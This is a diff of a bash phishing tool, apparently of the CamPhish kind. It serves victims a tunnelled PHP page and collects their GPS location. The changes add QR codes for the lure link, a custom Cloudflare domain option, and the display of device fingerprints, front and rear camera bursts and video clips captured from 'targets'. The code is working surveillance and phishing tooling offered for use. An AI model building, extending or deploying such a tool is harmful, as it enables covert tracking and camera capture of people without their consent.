@@ -50,6 +50,43 @@ dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 }
 
+generate_qr() {
+local qr_link="$1"
+local qr_file="qrcode.png"
+local encoded_link
+
+# URL-encode the link for the API
+encoded_link=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$qr_link'))" 2>/dev/null \
+  || python -c "import urllib.parse; print(urllib.parse.quote('$qr_link'))" 2>/dev/null \
+  || echo "$qr_link" | sed 's/:/%3A/g; s+/+%2F+g')
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Generating QR code...\e[0m\n"
+curl -s -o "$qr_file" \
+  "https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=${encoded_link}" \
+  2>/dev/null
+
+if [[ -f "$qr_file" ]] && [[ $(wc -c < "$qr_file") -gt 100 ]]; then
+  local abs_path
+  abs_path=$(realpath "$qr_file" 2>/dev/null || echo "$PWD/$qr_file")
+  printf "\e[1;92m[\e[0m*\e[1;92m] QR Code saved:\e[0m\e[1;77m %s\e[0m\n" "$abs_path"
+  printf "\e[1;92m[\e[0m*\e[1;92m] QR Code URL :\e[0m\e[1;77m https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encoded_link}\e[0m\n"
+  # Auto-open the QR code image
+  if [[ "$windows_mode" == true ]]; then
+    # Convert to Windows path and open
+    local win_path
+    win_path=$(cygpath -w "$abs_path" 2>/dev/null || echo "$abs_path" | sed 's|/\([a-z]\)/|\1:\\|; s|/|\\|g')
+    cmd.exe /c "start \"\" \"$win_path\"" > /dev/null 2>&1 &
+  elif [[ "$(uname -s)" == "Darwin" ]]; then
+    open "$abs_path" > /dev/null 2>&1 &
+  else
+    xdg-open "$abs_path" > /dev/null 2>&1 &
+  fi
+else
+  printf "\e[1;93m[!] QR code generation failed (no internet?). Visit:\e[0m\n"
+  printf "    https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encoded_link}\n"
+fi
+}
+
 stop() {
 if [[ "$windows_mode" == true ]]; then
   # Windows-specific process termination
@@ -129,14 +166,16 @@ catch_location() {
 }
 
 checkfound() {
-# Create directory for saved locations if it doesn't exist
 if [[ ! -d "saved_locations" ]]; then
   mkdir -p saved_locations
 fi
 
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is    \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Device fingerprinting is    \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Camera burst (front+rear) is \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Video clip capture is       \e[0m\e[1;93mACTIVE\e[0m\n"
 while [ true ]; do
 
 if [[ -e "ip.txt" ]]; then
@@ -147,30 +186,52 @@ fi
 
 sleep 0.5
 
-# Check for current_location.txt first (our new immediate indicator)
 if [[ -e "current_location.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
 catch_location
 fi
 
-# Also check for LocationLog.log (the original indicator)
 if [[ -e "LocationLog.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
-# Don't display the raw log content, just process it
 catch_location
 rm -rf LocationLog.log
 fi
 
-# Don't display error logs to avoid showing unwanted messages
 if [[ -e "LocationError.log" ]]; then
-# Just remove the file without displaying its contents
 rm -rf LocationError.log
 fi
 
+# Device fingerprint display
+if [[ -e "DeviceInfo.log" ]]; then
+  device_file=$(ls device_*.txt 2>/dev/null | tail -1)
+  if [[ -n "$device_file" ]]; then
+    printf "\n\e[1;92m[\e[0m+\e[1;92m] \e[0m\e[1;93mDevice fingerprint received!\e[0m\n"
+    printf "\e[1;92m[------------ Device Info ------------]\e[0m\n"
+    while IFS= read -r dline; do
+      if [[ "$dline" == "==="* ]] || [[ "$dline" == "---"* ]] || [[ -z "$dline" ]]; then continue; fi
+      printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;77m%s\e[0m\n" "$dline"
+    done < "$device_file"
+    printf "\e[1;92m[-------------------------------------]\e[0m\n"
+  fi
+  rm -rf DeviceInfo.log
+fi
+
+# Cam burst & video clip counts
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam files received!\e[0m\n"
+snap_dir="snapshots"
+if [[ -d "$snap_dir" ]]; then
+  front_n=$(ls "$snap_dir"/cam_front_*.jpg 2>/dev/null | wc -l | tr -d ' ')
+  rear_n=$(ls "$snap_dir"/cam_rear_*.jpg 2>/dev/null | wc -l | tr -d ' ')
+  vid_n=$(ls "$snap_dir"/vid_*.webm 2>/dev/null | wc -l | tr -d ' ')
+  printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Front cam burst  : %s photos\e[0m\n" "$front_n"
+  printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Rear cam burst   : %s photos\e[0m\n" "$rear_n"
+  printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Video clips      : %s clips\e[0m\n" "$vid_n"
+  printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Saved in         : snapshots/\e[0m\n"
+fi
 rm -rf Log.log
 fi
+
 sleep 0.5
 
 done 
@@ -259,16 +320,95 @@ else
 fi
 fi
 
+# ── Ask user: custom domain or random URL? ──────────────────────────────────
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Random URL  \e[0m\e[1;77m(no setup needed — e.g. abc123.trycloudflare.com)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom Domain\e[0m\e[1;77m (FREE — your own domain via Cloudflare)\e[0m\n"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose domain option: [Default is 1] \e[0m' cf_domain_option
+cf_domain_option="${cf_domain_option:-1}"
+
+if [[ $cf_domain_option -eq 2 ]]; then
+    # ── Custom Domain (Named Tunnel) ─────────────────────────────────────────
+    printf "\n"
+    printf "\e[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
+    printf "\e[1;92m  CUSTOM DOMAIN SETUP (Cloudflare — FREE)\e[0m\n"
+    printf "\e[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
+    printf "\e[1;77m  Requirements:\e[0m\n"
+    printf "\e[1;77m  • A domain added to Cloudflare (free account at cloudflare.com)\e[0m\n"
+    printf "\e[1;77m  • Your domain's nameservers must point to Cloudflare\e[0m\n"
+    printf "\e[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
+    printf "\n"
+
+    read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your custom domain (e.g. cam.yourdomain.com): \e[0m' cf_custom_domain
+    cf_custom_domain=$(echo "$cf_custom_domain" | tr -d '[:space:]')
+
+    if [[ -z "$cf_custom_domain" ]]; then
+        printf "\e[1;31m[!] No domain entered. Falling back to random URL.\e[0m\n"
+        cf_domain_option=1
+    else
+        # Tunnel name derived from domain (strip dots/special chars)
+        cf_tunnel_name=$(echo "$cf_custom_domain" | sed 's/[^a-zA-Z0-9_-]/-/g')
+
+        # Step 1: Login to Cloudflare (opens browser)
+        printf "\n\e[1;92m[\e[0m+\e[1;92m] Step 1: Logging in to Cloudflare...\e[0m\n"
+        printf "\e[1;77m  A browser window will open — log in and authorize.\e[0m\n"
+        if [[ "$windows_mode" == true ]]; then
+            ./cloudflared.exe tunnel login
+        else
+            ./cloudflared tunnel login
+        fi
+
+        # Step 2: Create named tunnel (ignore error if already exists)
+        printf "\n\e[1;92m[\e[0m+\e[1;92m] Step 2: Creating tunnel: $cf_tunnel_name\e[0m\n"
+        if [[ "$windows_mode" == true ]]; then
+            ./cloudflared.exe tunnel create "$cf_tunnel_name" > /dev/null 2>&1
+        else
+            ./cloudflared tunnel create "$cf_tunnel_name" > /dev/null 2>&1
+        fi
+
+        # Step 3: Route DNS (points your domain to this tunnel)
+        printf "\e[1;92m[\e[0m+\e[1;92m] Step 3: Routing DNS: $cf_custom_domain → tunnel\e[0m\n"
+        if [[ "$windows_mode" == true ]]; then
+            ./cloudflared.exe tunnel route dns "$cf_tunnel_name" "$cf_custom_domain" 2>&1
+        else
+            ./cloudflared tunnel route dns "$cf_tunnel_name" "$cf_custom_domain" 2>&1
+        fi
+
+        # Step 4: Start PHP server
+        printf "\n\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+        php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+        sleep 2
+
+        # Step 5: Start named tunnel
+        printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared named tunnel ($cf_tunnel_name)...\n"
+        rm -rf .cloudflared.log > /dev/null 2>&1
+        if [[ "$windows_mode" == true ]]; then
+            ./cloudflared.exe tunnel --url 127.0.0.1:3333 run "$cf_tunnel_name" > .cloudflared.log 2>&1 &
+        else
+            ./cloudflared tunnel --url 127.0.0.1:3333 run "$cf_tunnel_name" > .cloudflared.log 2>&1 &
+        fi
+
+        sleep 8
+        link="https://$cf_custom_domain"
+        printf "\e[1;92m[\e[0m*\e[1;92m] Custom domain link:\e[0m\e[1;77m %s\e[0m\n" $link
+        generate_qr "$link"
+        payload_cloudflare
+        checkfound
+        return
+    fi
+fi
+
+# ── Default: Random trycloudflare.com URL ────────────────────────────────────
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-rm -rf .cloudflared.log > /dev/null 2>&1 &
+rm -rf .cloudflared.log > /dev/null 2>&1
 
 if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared.exe tunnel --url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 else
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared tunnel --url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 fi
 
 sleep 10
@@ -284,13 +424,18 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudfla
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+generate_qr "$link"
 fi
 payload_cloudflare
 checkfound
 }
 
 payload_cloudflare() {
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+if [[ $cf_domain_option -eq 2 ]] && [[ -n "$cf_custom_domain" ]]; then
+    link="https://$cf_custom_domain"
+else
+    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+fi
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
@@ -440,6 +585,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngr
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+generate_qr "$link"
 fi
 payload_ngrok
 checkfound
